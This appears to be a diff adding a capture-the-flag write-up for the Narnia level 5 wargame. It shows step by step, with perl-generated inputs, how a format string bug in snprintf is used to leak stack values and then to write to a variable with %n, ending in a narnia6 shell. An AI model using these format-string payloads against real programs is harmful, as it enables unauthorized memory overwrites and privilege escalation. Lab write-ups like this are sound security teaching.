@@ -1,0 +1,51 @@
+running the binary gives us
+
+    Change i's value from 1 -> 500. No way...let me give you a hint!
+    buffer : [] (0)
+    i = 1 (0xffffd6f0)
+
+let's use a long input to see if we can change the variable.
+
+    ./narnia5 $(perl -e 'print "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVV"')
+
+    Change i's value from 1 -> 500. No way...let me give you a hint!
+    buffer : [AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPP] (63)
+    i = 1 (0xffffd690)
+
+So it looks like only 63 bytes of our input get copied, 64 including the NULL terminator. Disassembling main reveals
+this call:
+
+    0x08048528 <+29>:	call   0x80483f0 <snprintf@plt>
+
+    narnia5@narnia:/narnia$ ./narnia5 %08x.%08x.%08x.%08x
+    Change i's value from 1 -> 500. No way...let me give you a hint!
+    buffer : [f7fc5000.30303035.3330332e.33303330] (35)
+
+Looks like we've got a format string bug. First let's see if we can get a formatter to read a value we control.
+
+    ./narnia5 $(perl -e 'print "AAAA%08x%08x%08x%08x"')
+    Change i's value from 1 -> 500. No way...let me give you a hint!
+    buffer : [AAAA41414141313431343134313434333133] (36)
+
+So the very first formatter will use the first 4 bytes of our input as its parameter. If we make it an %n and write i's
+addr, we should be able to overwrite the value.
+
+    ./narnia5 $(perl -e 'print "\xe0\xd6\xff\xff" . "%n"')
+    Change i's value from 1 -> 500. No way...let me give you a hint!
+    buffer : [����] (4)
+    i = 4 (0xffffd6e0)
+
+Now, the issue is changing the value to what we want. First, let's see where i is with a dummy input of
+our payload size, which will be 500 bytes + formatter
+
+    ./narnia5 $(perl -e 'print "DDDD" . "A" x 496 . "%x"')
+    Change i's value from 1 -> 500. No way...let me give you a hint!
+    buffer : [DDDDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA] (63)
+    i = 1 (0xffffd4f0)
+
+Now all we need to do is replace the %x with an %n and pop in this address:
+
+    ./narnia5 $(perl -e 'print "\xf0\xd4\xff\xff" . "A" x 496 . "%n"')
+    Change i's value from 1 -> 500. GOOD
+    $ whoami
+    narnia6
